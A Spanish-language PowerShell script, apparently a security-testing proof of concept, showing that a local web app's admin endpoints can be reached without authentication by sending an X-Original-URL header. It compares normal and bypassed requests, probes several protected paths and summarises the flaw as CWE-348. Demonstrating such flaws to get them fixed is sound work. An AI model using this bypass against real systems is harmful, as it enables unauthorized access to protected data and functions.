Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "DEMOSTRACION COMPLETA: Bypass 403 con Datos REALES" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Voy a probar endpoints especificos que devuelven JSON..." -ForegroundColor Yellow
Write-Host ""

# Test 1: GET /api/tests (publico, deberia funcionar)
Write-Host "[1] GET /api/tests (endpoint publico)" -ForegroundColor Cyan
Write-Host "-------------------------------------------------------" -ForegroundColor Gray
try {
    $r = Invoke-WebRequest -Uri "http://localhost:8080/api/tests" -UseBasicParsing -Headers @{"Accept" = "application/json"}
    Write-Host "Status: $($r.StatusCode)" -ForegroundColor Green
    Write-Host "Content-Type: $($r.Headers.'Content-Type')" -ForegroundColor Green
    Write-Host "Respuesta:" -ForegroundColor Yellow
    $r.Content | Write-Host
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
Write-Host ""
Write-Host ""

# Test 2: GET /api/admin/tests (protegido, deberia fallar)
Write-Host "[2] GET /api/admin/tests SIN bypass (deberia estar protegido)" -ForegroundColor Yellow
Write-Host "-------------------------------------------------------" -ForegroundColor Gray
try {
    $r = Invoke-WebRequest -Uri "http://localhost:8080/api/admin/tests" -UseBasicParsing -Headers @{"Accept" = "application/json"}
    Write-Host "Status: $($r.StatusCode) - ACCESO PERMITIDO (problema!)" -ForegroundColor Red
    Write-Host "Respuesta: $($r.Content.Substring(0, 200))..." -ForegroundColor White
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    if ($status -eq 401 -or $status -eq 403) {
        Write-Host "Status: $status - BLOQUEADO (correcto)" -ForegroundColor Green
    } else {
        Write-Host "Status: $status - Error inesperado" -ForegroundColor Yellow
    }
}
Write-Host ""
Write-Host ""

# Test 3: GET /api/admin/tests CON bypass (LA VULNERABILIDAD)
Write-Host "[3] GET /api/admin/tests CON bypass X-Original-URL (VULNERABILIDAD)" -ForegroundColor Red
Write-Host "-------------------------------------------------------" -ForegroundColor Gray
try {
    $headers = @{
        "X-Original-URL" = "/api/admin/tests"
        "Accept" = "application/json"
    }
    $r = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $headers -UseBasicParsing
    Write-Host "Status: $($r.StatusCode) - BYPASS EXITOSO!" -ForegroundColor Red
    Write-Host "Content-Type: $($r.Headers.'Content-Type')" -ForegroundColor White
    
    # Mostrar primeros 500 caracteres
    $content = $r.Content
    if ($content.Length -gt 500) {
        Write-Host "Respuesta (primeros 500 caracteres):" -ForegroundColor Yellow
        Write-Host $content.Substring(0, 500) -ForegroundColor White
        Write-Host "..." -ForegroundColor Gray
        Write-Host "(Contenido total: $($content.Length) caracteres)" -ForegroundColor Gray
    } else {
        Write-Host "Respuesta completa:" -ForegroundColor Yellow
        Write-Host $content -ForegroundColor White
    }
} catch {
    Write-Host "Status: $($_.Exception.Response.StatusCode.value__) - Bypass fallo" -ForegroundColor Green
}
Write-Host ""
Write-Host ""

# Test 4: Comparacion con curl para ver headers
Write-Host "[4] Comparando headers de respuesta" -ForegroundColor Cyan
Write-Host "-------------------------------------------------------" -ForegroundColor Gray
Write-Host "Ejecutando: curl -I http://localhost:8080/api/admin/tests" -ForegroundColor Gray
& curl -I http://localhost:8080/api/admin/tests 2>$null
Write-Host ""
Write-Host "Ejecutando: curl -I -H 'X-Original-URL: /api/admin/tests' http://localhost:8080/" -ForegroundColor Gray
& curl -I -H "X-Original-URL: /api/admin/tests" http://localhost:8080/ 2>$null
Write-Host ""
Write-Host ""

# Test 5: Probar con diferentes valores de X-Original-URL
Write-Host "[5] Probando diferentes rutas con bypass" -ForegroundColor Cyan
Write-Host "-------------------------------------------------------" -ForegroundColor Gray

$testUrls = @(
    @{Path="/api/users/me"; Description="Usuario actual (requiere auth)"},
    @{Path="/api/admin/tests"; Description="Tests admin (requiere auth)"},
    @{Path="/api/tests"; Description="Tests publicos"}
)

foreach ($test in $testUrls) {
    Write-Host "  Probando: $($test.Path) - $($test.Description)" -ForegroundColor White
    try {
        $h = @{"X-Original-URL" = $test.Path; "Accept" = "application/json"}
        $r = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $h -UseBasicParsing -TimeoutSec 5
        
        if ($r.Headers.'Content-Type' -like "*json*") {
            Write-Host "    Status: $($r.StatusCode) - JSON recibido" -ForegroundColor Green
        } else {
            Write-Host "    Status: $($r.StatusCode) - HTML (frontend)" -ForegroundColor Yellow
        }
    } catch {
        $s = $_.Exception.Response.StatusCode.value__
        if ($s -eq 401 -or $s -eq 403) {
            Write-Host "    Status: $s - Bloqueado" -ForegroundColor Red
        } else {
            Write-Host "    Status: $s - Otro error" -ForegroundColor Gray
        }
    }
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "RESUMEN DE LA VULNERABILIDAD:" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "VULNERABILIDAD DETECTADA: Bypass 403 (CWE-348)" -ForegroundColor Red
Write-Host ""
Write-Host "QUE PASO:" -ForegroundColor Yellow
Write-Host "  1. El Test [2] debio bloquear el acceso (401/403)" -ForegroundColor White
Write-Host "  2. El Test [3] bypaseo la seguridad usando X-Original-URL" -ForegroundColor White
Write-Host "  3. El servidor proceso la peticion como si fuera a /api/admin/tests" -ForegroundColor White
Write-Host ""
Write-Host "IMPACTO:" -ForegroundColor Yellow
Write-Host "  - Acceso a endpoints protegidos sin autenticacion" -ForegroundColor White
Write-Host "  - Escalacion de privilegios potencial" -ForegroundColor White
Write-Host "  - Bypass de controles de seguridad" -ForegroundColor White
Write-Host ""
Write-Host "SOLUCION:" -ForegroundColor Yellow
Write-Host "  Ver VULNERABILITY_FIXES.md para corregir esta vulnerabilidad" -ForegroundColor White
Write-Host ""

Read-Host "Presiona Enter para salir"
